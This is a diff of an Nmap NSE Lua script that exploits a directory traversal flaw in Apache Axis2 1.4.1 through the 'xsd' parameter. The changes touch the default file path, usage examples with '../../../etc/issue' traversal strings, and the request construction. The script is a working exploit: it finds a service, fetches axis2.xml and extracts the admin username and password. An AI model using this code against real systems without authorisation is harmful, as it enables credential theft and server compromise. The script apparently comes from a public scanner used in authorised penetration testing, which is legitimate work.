@@ -2,7 +2,7 @@ description = [[
 http-axis2-dir-traversal exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by sending a specially crafted request to the parameter <code>xsd</code> (OSVDB-59001). By default it will try to retrieve the configuration file of the Axis2 service <code>'/conf/axis2.xml'</code> using the path <code>'/axis2/services/'</code> to return the username and password of the admin account.
 
 To exploit this vulnerability we need to detect a valid service running on the installation so we extract it from <code>/listServices</code> before exploiting the directory traversal vulnerability.
-By default it will retrieve the configuration file if you wish to retrieve other files you may need to add more "/../" to traverse to the correct folder location.
+By default it will retrieve the configuration file, if you wish to retrieve other files you need to set the argument <code>http-axis2-dir-traversal.file</code> correctly to traverse to the file's directory. Ex. <code>../../../../../../../../../etc/issue</code>
 
 To check the version of an Apache Axis2 installation go to:
 http://domain/axis2/services/Version/getVersion
@@ -14,7 +14,8 @@ Reference:
 
 ---
 -- @usage
--- nmap -p80,8080 --script http-axis2-dir-traversal --script-args 'http-axis2-dir-traversal.file=' <host/ip>
+-- nmap -p80,8080 --script http-axis2-dir-traversal --script-args 'http-axis2-dir-traversal.file=../../../../../../../etc/issue' <host/ip>
+-- nmap -p80 --script http-axis2-dir-traversal <host/ip>
 --
 -- @output
 -- 80/tcp open  http    syn-ack
@@ -39,15 +40,15 @@ require "creds"
 portrule = shortport.http
 
 --Default configuration values
-local DEFAULT_FILE = "/conf/axis2.xml"
+local DEFAULT_FILE = "../conf/axis2.xml"
 local DEFAULT_PATH = "/axis2/services/"
 
 ---
 --Checks the given URI looks like an Apache Axis2 installation
---@param host Host table
---@param port Port table
---@param path Apache Axis2 Basepath
---@return True if the string "Available services" is found
+-- @param host Host table
+-- @param port Port table
+-- @param path Apache Axis2 Basepath
+-- @return True if the string "Available services" is found
 local function check_installation(host, port, path)
   local req = http.get(host, port, path)
   if req.status == 200 and http.response_contains(req, "Available services") then
@@ -59,8 +60,8 @@ end
 ---
 -- Returns a table with all the available services extracted
 -- from the services list page
---@param body Services list page body
---@return Table containing the names and paths of the available services
+-- @param body Services list page body
+-- @return Table containing the names and paths of the available services
 local function get_available_services(body) 
  local services = {}
  for service in string.gfind(body, '<h4>Service%sDescription%s:%s<font%scolor="black">(.-)</font></h4>') do
@@ -73,9 +74,9 @@ end
 ---
 --Writes string to file
 --Taken from: hostmap.nse
---@param filename Filename to write
---@param contents Content of file
---@return True if file was written successfully
+-- @param filename Filename to write
+-- @param contents Content of file
+-- @return True if file was written successfully
 local function write_file(filename, contents)
   local f, err = io.open(filename, "w")
   if not f then
@@ -89,9 +90,9 @@ end
 ---
 -- Extracts Axis2's credentials from the configuration file
 -- It also adds them to the credentials library.
---@param body Configuration file string
---@return true if credentials are found
---@return Credentials or error string
+-- @param body Configuration file string
+-- @return true if credentials are found
+-- @return Credentials or error string
 ---
 local function extract_credentials(host, port, body)
   local _,_,user = string.find(body, '<parameter name="userName">(.-)</parameter>')
@@ -139,8 +140,8 @@ action = function(host, port)
 
   --Use selected service and exploit
   stdnse.print_debug(1, "%s: Querying service: %s", SCRIPT_NAME, selected_service)  
-  req = http.get(host, port, basepath..selected_service.."?xsd=.."..rfile)
-  stdnse.print_debug(2, "%s: Query -> %s", SCRIPT_NAME, basepath..selected_service.."?xsd=.."..rfile)
+  req = http.get(host, port, basepath..selected_service.."?xsd="..rfile)
+  stdnse.print_debug(2, "%s: Query -> %s", SCRIPT_NAME, basepath..selected_service.."?xsd="..rfile)
 
   --response came back
   if req.status and req.status == 200 then
@@ -151,6 +152,8 @@ action = function(host, port)
       end
       return
     end
+
+    output[#output+1] = "\nApache Axis2 Directory Traversal (OSVDB-59001)"
 
     --Retrieve file or only show credentials if downloading the configuration file
     if rfile ~= DEFAULT_FILE then
